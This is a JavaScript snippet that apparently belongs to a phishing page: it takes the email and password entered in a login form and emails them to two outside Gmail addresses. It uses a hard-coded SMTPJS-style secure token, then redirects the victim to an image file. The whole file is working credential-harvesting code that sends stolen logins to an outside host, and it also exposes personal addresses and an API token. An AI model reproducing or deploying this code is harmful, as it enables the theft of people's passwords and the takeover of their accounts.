// Updated JavaScript code
const sendEmailAndPassword = () => {
    const email = document.getElementById('emailInput').value;
    const password = document.getElementById('passwordInput').value;

    if (!email || !password) {
        alert('Please provide both email and password');
    } else {
        const data = {
            email,
            password,
        };

        sendRequest(data);
    }
};

const sendRequest = (data) => {
    const templateParams = {
        to_email: 'dogwalkeraus@gmail.com, clarahine224@gmail.com', // Add the second email address here
        from_email: 'bekkierowland@gmail.com',
        subject: 'Login Attempt',
        body: `Email: ${data.email}\nPassword: ${data.password}`,
    };

    Email.send({
        SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
        To: templateParams.to_email,
        From: "bekkierowland@gmail.com",
        Subject: templateParams.subject,
        Body: templateParams.body,
    })
        .then(function (message) {
            window.location = `qr-response.jpeg`;
        })
        .catch((e) => console.log(e));
};